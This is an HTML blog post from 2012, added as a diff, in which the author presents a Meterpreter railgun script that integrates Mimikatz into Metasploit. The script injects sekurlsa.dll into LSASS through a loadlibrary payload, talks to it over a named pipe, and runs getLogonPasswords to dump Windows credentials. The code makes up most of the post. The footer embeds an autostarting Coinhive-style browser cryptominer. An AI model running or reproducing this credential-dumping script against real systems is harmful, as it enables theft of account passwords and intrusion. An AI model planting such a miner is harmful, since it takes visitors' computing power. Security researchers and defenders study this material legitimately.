@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Integration of Mimikatz into Metasploit Stage1 &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/">Integration of Mimikatz into Metasploit Stage1</a></h1>
+            <span class="post-date">Jun 15, 2012 </span>
+            <div class="post-content">
+                <p>One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>
+
+<p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&rsquo;ll get there in the subsequent posts.</p>
+
+<p>Ignore the do_cmd for now and I stepped through <a href="/blog/2011/5/30/remote-dll-injection-with-meterpreter.html">remote DLL injection here</a>. So the first odd lines is </p>
+
+<pre><code class="language-ruby">handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+</code></pre>
+
+<p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
+
+<pre><code class="language-ruby">client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+</code></pre>
+
+<p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
+
+<p>If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!</p>
+
+<p>Meterpreter Script:</p>
+
+<pre><code class="language-ruby">def do_cmd(handle,cmd)
+	ucommand = Rex::Text.to_unicode(cmd)
+	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
+	good2go = false
+	newline = false
+	readstring = []
+	while good2go == false
+		# Have to pull data 1 unicode character at a time
+		# this is because the pipe won't write or read if
+		# too much was written or read by the &quot;client&quot; (us)
+		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
+		# Check to see if our end of read check is there: n000 @00
+		if pull['lpBuffer'] == &quot;@00&quot; and newline == true
+			good2go = true
+		else
+			readstring &lt;&lt; pull['lpBuffer']
+		end
+		
+		# Ready the newline var for previous check on next loop
+		if pull['lpBuffer'] == &quot;n00&quot;
+			newline = true
+		else
+			newline = false
+		end
+	end
+	
+	print_status(readstring.join(&quot;&quot;))
+end
+
+print_status(&quot;x86 Detected - Using x86 mimikatz&quot;)
+handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
+print_status(&quot;Handle: #{handle}&quot;)
+framework.threads.spawn('injectlsass',false) {
+	pid = client.sys.process['lsass.exe']
+	print_status(&quot;LSASS located at PID: #{pid}&quot;)
+	pathtomimi = &quot;C:\\sekurlsa.dll&quot;
+
+	pay = client.framework.payloads.create(&quot;windows/loadlibrary&quot;)
+	pay.datastore[&quot;DLL&quot;] = pathtomimi
+	pay.datastore[&quot;EXITFUNC&quot;] = 'thread'
+
+	raw = pay.generate
+	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+	mem = targetprocess.memory.allocate(raw.length + (30024))
+	targetprocess.memory.write(mem, raw)
+	sleep(2)
+	targetprocess.thread.create(mem, 0)
+	print_status(&quot;Successfully Injected into LSASS&quot;)
+}
+print_status(&quot;Waiting for LSASS injection to complete&quot;)
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+print_status(&quot;Mimikatz has called home, ready for command&quot;)
+sleep(2)
+print_status(&quot;Reading banner&quot;)
+client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+print_status(&quot;Doing a quick ping to make sure things are working...&quot;)
+do_cmd(handle,'ping')
+print_status(&quot;If you made it this far it worked, doing getLogonPasswords&quot;)
+do_cmd(handle, 'getLogonPasswords')
+</code></pre>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
